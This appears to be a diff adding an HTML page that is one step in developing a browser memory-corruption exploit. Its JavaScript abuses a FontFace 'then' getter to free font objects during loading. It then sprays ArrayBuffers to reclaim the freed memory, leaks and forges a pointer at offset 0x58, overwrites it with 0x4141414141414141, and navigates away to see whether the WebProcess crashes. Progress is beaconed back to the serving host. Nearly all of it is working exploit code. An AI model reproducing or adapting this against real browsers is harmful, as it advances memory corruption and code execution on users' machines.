@@ -1,0 +1,178 @@
+<!--
+  p656j1: poison m_table + navigate — does teardown deref our field?
+
+  Decision probe. Evidence:
+    p656b/i: forge confirmed; rc=seed+1; m_table(+0x58)=ours
+    p656i: NOTHING derefs our fields in-world (60 polls, GBs of GC, stable)
+    p656h: teardown with BENIGN m_table (=T1 valid) does NOT crash the
+           WebProcess (h2 loaded fine)
+
+  So: rewrite +0x58 = 0x4141414141414141 right before navigating.
+    - If teardown derefs m_table -> WebProcess crash during nav ->
+      j2 never beacons (guide reload storm instead)
+    - If j2 beacons LANDED -> destructor does not deref m_table
+  Binary oracle. W (+0x68) left VALID (single variable).
+
+  Beacon: P656J1- (phase 1), P656J2- (landing proof).
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p656j1</title></head>
+<body>p656j1: poison + nav
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P656J1-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'poison-nav');
+flush();
+
+var bufs1 = [], bufs2 = [];
+var T1_lo = 0, T1_hi = 0;
+var phase = 0;
+
+var sty1 = document.createElement('style');
+sty1.textContent = "@font-face { font-family: sa; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(sty1);
+
+var ffA = new FontFace('fa', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+void ffA.loaded;
+
+var sty2 = document.createElement('style');
+sty2.textContent = "@font-face { font-family: sb; src: local(Arial); unicode-range: U+0043; }";
+document.head.appendChild(sty2);
+
+var ffB = new FontFace('fb', 'local(Helvetica)', { unicodeRange: 'U+0044' });
+document.fonts.add(ffB);
+void ffB.loaded;
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (phase === 1) {
+      phase = 0;
+      sty1.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      for (var i = 0; i < 80; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv = new DataView(ab);
+        dv.setUint32(0x00, 2, true);
+        dv.setUint32(0x04, 0xAAAA0001, true);
+        bufs1.push({ dv: dv });
+      }
+      emit('TRAP1', 'spray=80');
+      return undefined;
+    }
+    if (phase === 2) {
+      phase = 0;
+      sty2.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      for (var i = 0; i < 80; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv = new DataView(ab);
+        dv.setUint32(0x00, 0, true);
+        dv.setUint32(0x04, 0xCCCC000A, true);
+        dv.setUint32(0x58, T1_lo, true);
+        dv.setUint32(0x5C, T1_hi, true);
+        bufs2.push({ dv: dv });
+      }
+      emit('TRAP2', 'spray=80 forge=T1');
+      return undefined;
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+phase = 1;
+document.fonts.load('1em fa, sa', 'AB');
+
+setTimeout(function() {
+try {
+  var hit1 = -1;
+  for (var i = 0; i < bufs1.length; i++) {
+    if (bufs1[i].dv.getUint32(0, true) !== 2) { hit1 = i; break; }
+  }
+  if (hit1 < 0) {
+    for (var j = 0; j < bufs1.length; j++) {
+      if (bufs1[j].dv.getUint32(0x58, true) !== 0 || bufs1[j].dv.getUint32(0x5C, true) !== 0) { hit1 = j; break; }
+    }
+  }
+  if (hit1 < 0) { emit('P1-MISS', 'stop-no-nav'); flush(); return; }
+
+  var dv1 = bufs1[hit1].dv;
+  T1_lo = dv1.getUint32(0x58, true);
+  T1_hi = dv1.getUint32(0x5C, true);
+  emit('P1-HIT', 'T1=' + hex32(T1_hi) + hex32(T1_lo));
+  flush();
+  if (!T1_lo && !T1_hi) { emit('P1-FAIL', 'stop-no-nav'); flush(); return; }
+
+  phase = 2;
+  document.fonts.load('1em fb, sb', 'CD');
+
+  setTimeout(function() {
+  try {
+    var hit2 = -1;
+    for (var i = 0; i < bufs2.length; i++) {
+      if (bufs2[i].dv.getUint32(0, true) !== 0) { hit2 = i; break; }
+    }
+    if (hit2 < 0) {
+      for (var j = 0; j < bufs2.length; j++) {
+        if (bufs2[j].dv.getUint32(0x68, true) !== 0 || bufs2[j].dv.getUint32(0x6C, true) !== 0) { hit2 = j; break; }
+      }
+    }
+    if (hit2 < 0) { emit('P2-MISS', 'stop-no-nav'); flush(); return; }
+
+    var dv2 = bufs2[hit2].dv;
+    var rc2 = dv2.getUint32(0, true);
+    var held = (dv2.getUint32(0x58, true) === T1_lo && dv2.getUint32(0x5C, true) === T1_hi);
+    emit('P2-HIT', 'rc=' + rc2 + ' forge=' + held);
+    flush();
+    if (!held) { emit('FORGE-FAIL', 'stop-no-nav'); flush(); return; }
+
+    // ============ POISON m_table ONLY ============
+    // W (+0x68) stays valid. rc stays 1. Single variable.
+    dv2.setUint32(0x58, 0x41414141, true);
+    dv2.setUint32(0x5C, 0x41414141, true);
+
+    var chk_lo = dv2.getUint32(0x58, true);
+    var chk_hi = dv2.getUint32(0x5C, true);
+    emit('POISON', '+0x58=' + hex32(chk_hi) + hex32(chk_lo) + ' (was T1)');
+
+    // settle beacon BEFORE nav (synchronous XHR guarantees delivery)
+    flush();
+
+    setTimeout(function() {
+      emit('NAV', '/p656j2 — oracle armed');
+      flush();
+      try { location.replace('/p656j2'); } catch(e) { emit('NAV-ERR', String(e).slice(0,60)); flush(); }
+    }, 300);
+
+  } catch(e2) { emit('P2-FATAL', String(e2).slice(0,120)); flush(); }
+  }, 150);
+
+} catch(e1) { emit('P1-FATAL', String(e1).slice(0,120)); flush(); }
+}, 100);
+
+})();
+</script>
+</body></html>
